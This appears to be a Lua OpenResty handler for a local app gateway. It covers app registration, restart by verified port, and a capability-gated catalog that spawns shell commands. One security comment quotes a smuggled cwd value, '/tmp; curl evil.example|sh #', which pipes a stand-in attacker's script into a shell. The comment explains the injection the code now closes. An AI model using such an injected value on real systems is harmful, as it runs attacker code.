local cjson = require "cjson.safe"
local operator = require "lib.operator_access"

local function getNetgetDataDir()
  local env_dir = os.getenv("NETGET_DATA_DIR")
  if env_dir and env_dir ~= "" then return env_dir end
  if ngx and ngx.var and ngx.var.NETGET_DATA_DIR and ngx.var.NETGET_DATA_DIR ~= "" then
    return ngx.var.NETGET_DATA_DIR
  end
  return os.getenv("HOME") .. "/.get"
end

local netgetDir   = getNetgetDataDir()
local runtimeDir  = netgetDir .. "/runtime"
local appsPath    = runtimeDir .. "/apps.json"
local claimsPath  = runtimeDir .. "/gateway-claims.json"
local catalogPath = runtimeDir .. "/monad-catalog.json"

local function set_json()
  ngx.header["Content-Type"] = "application/json; charset=utf-8"
end

local function json(status, payload)
  set_json()
  ngx.status = status
  ngx.say(cjson.encode(payload or {}))
end

local function is_local_request()
  local ip = ngx.var.remote_addr or ""
  return ip == "127.0.0.1" or ip == "::1" or ip == "unix:"
end

-- Single-quotes a string for safe interpolation into a POSIX shell command
-- line: wraps it in '...', escaping any embedded single quote as '\''. Used
-- for fields that are meant to be an inert PATH STRING, never shell syntax
-- -- cwd and the internally-built log path below, NOT cmd (cmd is the one
-- field a properly-authorized caller deliberately gets to have run as a
-- real shell command; quoting it would defeat the whole point of the
-- catalog). Confirmed live 2026-10-03: before this, cwd was interpolated
-- raw via string.format("cd %s && ...", cwd, ...) -- a cwd value like
-- `/tmp; curl evil.example|sh #` would run a second, fully independent
-- command via the unescaped `;`, entirely separate from whatever cmd said,
-- even once cmd's own execution is properly authorized.
local function shell_quote(s)
  return "'" .. tostring(s or ""):gsub("'", "'\\''") .. "'"
end

local function read_file(path)
  local f = io.open(path, "r")
  if not f then return nil end
  local data = f:read("*a")
  f:close()
  return data
end

local function read_registry()
  local raw = read_file(appsPath)
  if not raw or raw == "" then
    return { version = 1, apps = {} }
  end
  local decoded = cjson.decode(raw)
  if not decoded or type(decoded) ~= "table" then
    return { version = 1, apps = {} }
  end
  decoded.apps = decoded.apps or {}
  return decoded
end

local function write_registry(registry)
  os.execute("mkdir -p " .. runtimeDir)
  registry.version = (tonumber(registry.version) or 0) + 1
  registry.updatedAt = os.date("!%Y-%m-%dT%H:%M:%SZ")

  local tmp = appsPath .. ".tmp"
  local f, err = io.open(tmp, "w")
  if not f then return nil, err end
  f:write(cjson.encode(registry))
  f:close()
  return os.rename(tmp, appsPath)
end

local function now_ms()
  return ngx.now() * 1000
end

-- Confirms a claimed port is actually answering as a real monad surface --
-- not just that something is listening there. Found live 2026-10-03: before
-- this, report_app() stored whatever `port` a caller sent with zero
-- verification, and restart_all() later ran `lsof -ti tcp:<port>` + `kill`
-- against it -- a loopback-only caller (the same browser-mediated CSRF this
-- file's own catalog fix closes elsewhere) could register an attacker-chosen
-- port belonging to a completely unrelated process and have restart_all
-- terminate it. tonumber()-gating port/pid before interpolating them into
-- the shell command (already in place) rules out command injection there,
-- but says nothing about whether the SELECTED process is actually one this
-- service manages -- a different failure, in authorization and process
-- selection, not in shell quoting.
--
-- This does not perform full claim verification (checking the surface
-- payload's own self-signature against an identity this gateway already
-- trusts, the way checkMonadSurfaceClaim does on the GUI side) -- closing
-- that fully is gap #1/#2 in CLAUDE.md (surface identity / claim
-- verification), explicitly future work. What this closes: an arbitrary,
-- unrelated local process can no longer be registered or restarted just by
-- naming its port -- the port must actually speak the monad surface
-- protocol, at both report time and (re-checked fresh below) restart time.
-- curl (not lsof) is used deliberately: confirmed live in this same session
-- that OpenResty's io.popen() hands the command to a /bin/sh whose PATH
-- (/usr/gnu/bin:/usr/local/bin:/bin:/usr/bin:.) includes /usr/bin (where
-- curl lives) but not /usr/sbin (where lsof lives).
local function probe_monad_surface(port)
  local p = tonumber(port)
  if not p or p <= 0 or p > 65535 then return nil end
  local cmd = string.format("curl -s --max-time 2 http://127.0.0.1:%d/__surface 2>/dev/null", p)
  local h = io.popen(cmd)
  if not h then return nil end
  local out = h:read("*a")
  h:close()
  if not out or out == "" then return nil end
  local ok, parsed = pcall(cjson.decode, out)
  if not ok or type(parsed) ~= "table" then return nil end
  local monadId = parsed.monadId or (type(parsed.monad) == "table" and parsed.monad.id) or nil
  if type(monadId) ~= "string" or monadId == "" then return nil end
  return { monadId = monadId }
end

-- Read the gateway claims snapshot (written by GatewayClaimsManager).
-- Returns {} when the file is absent or unparseable — safe fallback to guest.
local function read_claims()
  local raw = read_file(claimsPath)
  if not raw or raw == "" then return {} end
  local decoded = cjson.decode(raw)
  return type(decoded) == "table" and decoded or {}
end

-- Resolve trust level from the app's identity_hash against the gateway claims.
--   owner  → identity_hash == claims.owner
--   admin  → identity_hash in claims.admins
--   peer   → identity_hash present but not owner/admin
--   guest  → identity_hash absent or empty
local function derive_trust(identity_hash, claims)
  if not identity_hash or identity_hash == "" then return "guest" end
  if claims.owner and identity_hash == claims.owner then return "owner" end
  if type(claims.admins) == "table" and claims.admins[identity_hash] then return "admin" end
  return "peer"
end

local function scrub_dead_apps(registry)
  local current = now_ms()
  local live = {}
  for id, app in pairs(registry.apps or {}) do
    local ttl = tonumber(app.ttlMs) or 45000
    local lastSeen = tonumber(app.lastSeenMs) or 0
    if current - lastSeen <= ttl then
      live[id] = app
    end
  end
  registry.apps = live
  return registry
end

local function report_app()
  if not is_local_request() then
    return json(403, { success = false, error = "Apps can only report to the local NetGet agent." })
  end
  if ngx.req.get_method() ~= "POST" then
    return json(405, { success = false, error = "Use POST." })
  end

  ngx.req.read_body()
  local body = ngx.req.get_body_data()
  if not body or body == "" then
    return json(400, { success = false, error = "JSON body is required." })
  end

  local app = cjson.decode(body)
  if not app or type(app) ~= "table" then
    return json(400, { success = false, error = "Invalid JSON body." })
  end
  if not app.id or not app.name then
    return json(400, { success = false, error = "App id and name are required." })
  end

  -- Evidence the reported port is actually a monad this service manages,
  -- not just a number the caller picked -- see probe_monad_surface()'s own
  -- comment for what this does and does not close.
  local claimedPort = tonumber(app.port)
  if not claimedPort or claimedPort <= 0 then
    return json(400, { success = false, error = "A valid port is required." })
  end
  local surface = probe_monad_surface(claimedPort)
  if not surface then
    return json(422, { success = false, error = "PORT_NOT_VERIFIED", message = "port " .. claimedPort .. " did not answer as a monad surface." })
  end
  app.verifiedMonadId = surface.monadId

  local registry = scrub_dead_apps(read_registry())
  app.lastSeenMs = now_ms()
  app.localOnly = true

  -- Materialize trust level at ingest time — never re-derived at route time.
  local claims = read_claims()
  local meta = type(app.metadata) == "table" and app.metadata or {}
  local id_hash = tostring(meta.identity_hash or meta.identityHash or "")
  app.trust = derive_trust(id_hash, claims)
  if app.trust ~= "guest" then
    app.verified_at = now_ms()
  end

  -- frontendMode is an operator preference (set via the frontend_mode
  -- action below, not reported by the app itself) — this assignment is a
  -- wholesale replace, so without preserving it here the next heartbeat
  -- (≤ MONAD_NETGET_HEARTBEAT_MS, ~3s) would silently wipe the toggle back
  -- to unset every time.
  local existing = registry.apps[app.id]
  if existing and existing.frontendMode and not app.frontendMode then
    app.frontendMode = existing.frontendMode
  end

  registry.apps[app.id] = app

  local ok, err = write_registry(registry)
  if not ok then
    return json(500, { success = false, error = err or "Could not write app registry." })
  end

  return json(200, { success = true, id = app.id, localOnly = true })
end

local function list_apps()
  if not is_local_request() then
    return json(403, { success = false, error = "App registry is local-only until auth/policies are enabled." })
  end

  local registry = scrub_dead_apps(read_registry())
  write_registry(registry)

  local apps = {}
  for _, app in pairs(registry.apps or {}) do
    table.insert(apps, app)
  end

  local count = #apps
  if count == 0 then apps = cjson.empty_array end
  return json(200, { success = true, apps = apps, count = count, updatedAt = registry.updatedAt })
end

local function release_app()
  if not is_local_request() then
    return json(403, { success = false, error = "Apps can only release from the local NetGet agent." })
  end
  if ngx.req.get_method() ~= "POST" then
    return json(405, { success = false, error = "Use POST." })
  end

  ngx.req.read_body()
  local body = ngx.req.get_body_data()
  if not body or body == "" then
    return json(400, { success = false, error = "JSON body is required." })
  end

  local req = cjson.decode(body)
  if not req or type(req) ~= "table" or not req.id then
    return json(400, { success = false, error = "App id is required." })
  end

  local registry = read_registry()
  registry.apps[req.id] = nil

  local ok, err = write_registry(registry)
  if not ok then
    return json(500, { success = false, error = err or "Could not write app registry." })
  end

  return json(200, { success = true, id = req.id })
end

-- /usr/sbin, not just /bin:/usr/bin -- lsof lives there on macOS, and (see
-- probe_monad_surface's comment) io.popen()'s /bin/sh does not have it on
-- PATH by default. Deliberately an absolute path, not a PATH export: this
-- function only ever reaches lsof/kill AFTER re-verifying the target below,
-- so there is no reason to also widen what io.popen can resolve generally.
local LSOF_BIN = "/usr/sbin/lsof"

local function restart_all()
  if not is_local_request() then
    return json(403, { success = false, error = "Only local requests can restart monads." })
  end
  if ngx.req.get_method() ~= "POST" then
    return json(405, { success = false, error = "Use POST." })
  end
  local registry = scrub_dead_apps(read_registry())
  local restarted, skipped = {}, {}
  for _, app in pairs(registry.apps or {}) do
    local port = tonumber(app.port)
    if port and port > 0 then
      -- Re-verify fresh, right before terminating anything -- report_app()
      -- already checked this port once at registration time, but trusting
      -- that stale check here would leave a TOCTOU window open: the port
      -- could have gone quiet and been reassigned to something else
      -- entirely in the time since. Only ever kill what answers as a real
      -- monad surface RIGHT NOW, not what a registry entry merely claims.
      local surface = probe_monad_surface(port)
      if surface then
        local handle = io.popen(string.format("%s -ti tcp:%d 2>/dev/null", LSOF_BIN, port))
        local pid_str = handle and handle:read("*l")
        if handle then handle:close() end
        local pid = tonumber(pid_str)
        if pid then
          os.execute(string.format("kill -TERM %d 2>/dev/null", pid))
          table.insert(restarted, { name = app.name, port = port, pid = pid, monadId = surface.monadId })
        else
          table.insert(skipped, { name = app.name, port = port, reason = "pid not found" })
        end
      else
        table.insert(skipped, { name = app.name, port = port, reason = "not verified as a monad surface" })
      end
    end
  end
  return json(200, { success = true, restarted = restarted, skipped = skipped, count = #restarted })
end

-- ── Catalog: name → start command registry ───────────────────────────────────

local function read_catalog()
  local f = io.open(catalogPath, "r")
  if not f then return {} end
  local raw = f:read("*a"); f:close()
  if not raw or raw == "" then return {} end
  local decoded = cjson.decode(raw)
  return type(decoded) == "table" and decoded or {}
end

local function write_catalog(catalog)
  os.execute("mkdir -p " .. runtimeDir)
  local tmp = catalogPath .. ".tmp"
  local f, err = io.open(tmp, "w")
  if not f then return nil, err end
  f:write(cjson.encode(catalog))
  f:close()
  return os.rename(tmp, catalogPath)
end

local function normalize_name(s)
  return tostring(s or ""):lower():match("^([a-z0-9][a-z0-9%-%_%.]*)")
end

local function list_catalog()
  if not is_local_request() then
    return json(403, { success = false, error = "Catalog is local-only." })
  end
  local catalog = read_catalog()
  local entries = {}
  for name, entry in pairs(catalog) do
    local e = type(entry) == "table" and entry or {}
    table.insert(entries, {
      name      = name,
      cmd       = e.cmd or "",
      cwd       = e.cwd or "",
      autoStart = e.autoStart ~= false,
    })
  end
  local count = #entries
  if count == 0 then entries = cjson.empty_array end
  return json(200, { success = true, catalog = entries, count = count })
end

-- upsert/delete/spawn are the catalog's real mutation surface -- spawn runs
-- the entry's own cmd via io.popen, so writing an entry and spawning it is,
-- end to end, an arbitrary-shell-command primitive. is_local_request() alone
-- doesn't distinguish a real operator from a browser on this machine a
-- malicious page tricked into sending the request (confirmed live
-- 2026-10-03: a simulated cross-origin request chain, no credentials beyond
-- being on this machine, upserted a catalog entry and spawned it for real).
-- The location for each of these three already ran middleware/me_sig.lua in
-- its access phase (setNginxConfigRoutes.ts's controlActionGate), so
-- ngx.ctx.me_scopes is already populated here -- has_capability() is the
-- actual capability decision, same model as openresty.lua's restart/stop.
--
-- gateway:control:apps-catalog-upsert is not a narrow "edit a config record"
-- permission -- cmd is stored and later run verbatim by spawn (gated
-- separately below). Granting upsert to an identity that can ALSO reach
-- spawn is, in practice, granting it arbitrary command execution as the
-- gateway's own process. Treat an upsert grant with that weight; it is not
-- interchangeable with a narrower capability like apps-catalog-delete just
-- because all three sit in the same CATALOG_CAPABILITY table.
local CATALOG_CAPABILITY = {
  upsert = "gateway:control:apps-catalog-upsert",
  delete = "gateway:control:apps-catalog-delete",
  spawn  = "gateway:control:apps-catalog-spawn",
}

local function upsert_catalog()
  if not is_local_request() then
    return json(403, { success = false, error = "Catalog is local-only." })
  end
  if not operator.has_capability(CATALOG_CAPABILITY.upsert) then
    return json(403, { success = false, error = "CAPABILITY_DENIED", required = CATALOG_CAPABILITY.upsert })
  end
  ngx.req.read_body()
  local body = ngx.req.get_body_data()
  if not body or body == "" then
    return json(400, { success = false, error = "JSON body required." })
  end
  local req = cjson.decode(body)
  if not req or type(req) ~= "table" then
    return json(400, { success = false, error = "Invalid JSON." })
  end
  local name = normalize_name(req.name)
  if not name or name == "" then
    return json(400, { success = false, error = "name is required (alphanumeric, hyphens, dots)." })
  end
  local cmd = tostring(req.cmd or "")
  if cmd == "" then
    return json(400, { success = false, error = "cmd (start command) is required." })
  end
  local catalog = read_catalog()
  catalog[name] = {
    cmd       = cmd,
    cwd       = tostring(req.cwd or "~"),
    autoStart = req.autoStart ~= false,
  }
  local ok, err = write_catalog(catalog)
  if not ok then
    return json(500, { success = false, error = err or "Could not write catalog." })
  end
  return json(200, { success = true, name = name })
end

local function delete_catalog_entry()
  if not is_local_request() then
    return json(403, { success = false, error = "Catalog is local-only." })
  end
  if not operator.has_capability(CATALOG_CAPABILITY.delete) then
    return json(403, { success = false, error = "CAPABILITY_DENIED", required = CATALOG_CAPABILITY.delete })
  end
  ngx.req.read_body()
  local body = ngx.req.get_body_data()
  if not body or body == "" then
    return json(400, { success = false, error = "JSON body required." })
  end
  local req = cjson.decode(body)
  if not req or not req.name then
    return json(400, { success = false, error = "name is required." })
  end
  local catalog = read_catalog()
  catalog[req.name] = nil
  local ok, err = write_catalog(catalog)
  if not ok then
    return json(500, { success = false, error = err or "Could not write catalog." })
  end
  return json(200, { success = true, name = req.name })
end

local function spawn_catalog_monad()
  if not is_local_request() then
    return json(403, { success = false, error = "Spawn is local-only." })
  end
  if ngx.req.get_method() ~= "POST" then
    return json(405, { success = false, error = "Use POST." })
  end
  if not operator.has_capability(CATALOG_CAPABILITY.spawn) then
    return json(403, { success = false, error = "CAPABILITY_DENIED", required = CATALOG_CAPABILITY.spawn })
  end
  ngx.req.read_body()
  local body = ngx.req.get_body_data()
  local req  = body and cjson.decode(body) or {}
  local name = normalize_name(type(req) == "table" and req.name or "")
  if not name or name == "" then
    return json(400, { success = false, error = "name is required." })
  end
  local catalog = read_catalog()
  local entry   = catalog[name]
  if not entry then
    return json(404, { success = false, error = "Monad '" .. name .. "' not in catalog." })
  end
  local cmd = tostring(entry.cmd or "")
  if cmd == "" then
    return json(400, { success = false, error = "Catalog entry has no cmd." })
  end
  local home = os.getenv("HOME") or ""
  local cwd  = tostring(entry.cwd or home):gsub("^~", home)
  local log  = runtimeDir .. "/" .. name .. ".spawn.log"
  -- cmd is deliberately unquoted -- it is the one field a properly-
  -- authorized caller gets to have run as a real shell command, the
  -- catalog's whole point. cwd and log are NOT supposed to be shell syntax,
  -- just a path each -- shell_quote() keeps them that way regardless of
  -- content (see its own comment for the concrete cwd-breakout this closes).
  local full = string.format("cd %s && %s >> %s 2>&1 &", shell_quote(cwd), cmd, shell_quote(log))
  local h = io.popen(full)
  if h then h:close() end
  return json(200, { success = true, name = name, message = "Spawn signal sent." })
end

-- ── Frontend mode: per-app dev ↔ dist toggle ──────────────────────────────────
-- Generalizes the same dev/static-dist switch netget's own Main Server panel
-- has always had (mainServerFrontend.ts) to any registered app, addressed at
-- /apps/<name>/__frontend-mode. See setNginxConfigRoutes.ts for why this is a
-- generic regex location (works before any app-specific config exists) plus a
-- per-app exact-match override once an app is in dist mode.

local function normalize_token(value)
  local text = tostring(value or ""):lower()
  text = text:gsub("[^a-z0-9%._%-]+", "-")
  text = text:gsub("^%-+", ""):gsub("%-+$", "")
  return text
end

local function app_monad_name(app)
  local metadata = type(app.metadata) == "table" and app.metadata or {}
  local direct = normalize_token(metadata.monadName)
  if direct ~= "" then return direct end
  local name = tostring(app.name or "")
  name = name:gsub("^monad:", "")
  return normalize_token(name)
end

local function find_app_by_name(name)
  local wanted = normalize_token(ngx.unescape_uri(name or ""))
  if wanted == "" then return nil end
  local registry = read_registry()
  for _, app in pairs(registry.apps or {}) do
    if app_monad_name(app) == wanted or normalize_token(app.id) == wanted then
      return app
    end
  end
  return nil
end

local function file_exists(path)
  local f = io.open(path, "r")
  if not f then return false end
  f:close()
  return true
end

local function frontend_mode()
  if not is_local_request() then
    return json(403, { success = false, error = "Frontend mode is local-only until auth/policies are enabled." })
  end

  local name = ngx.var.apps_target
  local app = find_app_by_name(name)
  if not app then
    return json(404, { success = false, error = "App '" .. tostring(name) .. "' is not registered." })
  end

  if ngx.req.get_method() == "GET" then
    local meta = type(app.metadata) == "table" and app.metadata or {}
    return json(200, {
      success = true,
      name = name,
      frontendMode = app.frontendMode or "dev",
      distDir = meta.frontendDistDir,
    })
  end

  ngx.req.read_body()
  local body = ngx.req.get_body_data()
  local req = body and cjson.decode(body) or nil
  local mode = req and tostring(req.mode or "") or ""
  if mode ~= "dev" and mode ~= "dist" then
    return json(400, { success = false, error = "Invalid mode: \"" .. mode .. "\". Use dev or dist." })
  end

  local meta = type(app.metadata) == "table" and app.metadata or {}
  local distDir = tostring(meta.frontendDistDir or "")
  if mode == "dist" then
    if distDir == "" or not file_exists(distDir .. "/index.html") then
      return json(400, {
        success = false,
        error = "No built dist found at " .. (distDir ~= "" and distDir or "(unreported)")
          .. "/index.html — run the app's build first.",
      })
    end
  end

  local registry = read_registry()
  local id = app.id
  if not registry.apps[id] then
    return json(404, { success = false, error = "App '" .. tostring(name) .. "' is no longer registered." })
  end
  registry.apps[id].frontendMode = mode

  local ok, err = write_registry(registry)
  if not ok then
    return json(500, { success = false, error = err or "Could not write app registry." })
  end

  return json(200, { success = true, name = name, frontendMode = mode })
end

local action = ngx.var.apps_action
if action == "report" then
  return report_app()
elseif action == "list" then
  return list_apps()
elseif action == "release" then
  return release_app()
elseif action == "restart_all" then
  return restart_all()
elseif action == "catalog_list" then
  return list_catalog()
elseif action == "catalog_upsert" then
  return upsert_catalog()
elseif action == "catalog_delete" then
  return delete_catalog_entry()
elseif action == "catalog_spawn" then
  return spawn_catalog_monad()
elseif action == "frontend_mode" then
  return frontend_mode()
end

return json(404, { success = false, error = "Unknown apps action." })
